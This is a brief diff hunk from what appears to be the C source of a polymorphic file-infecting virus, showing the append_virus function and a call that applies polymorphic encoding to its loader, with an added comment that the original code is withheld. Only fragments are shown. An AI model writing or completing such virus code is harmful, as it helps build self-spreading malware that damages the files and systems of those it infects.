@@ -58,7 +58,7 @@ void    append_virus(void *mapped, int size, char *file, unsigned long _start_ad
     tmp2 = &tmp;
    
     
-   
+    // Applied the poly only on the loader, i just can't publish the original code :c
     // disass for loader
     op_c(clone + size, (unsigned long)&loader_vars - (unsigned long)&virus, fd, seed);
     
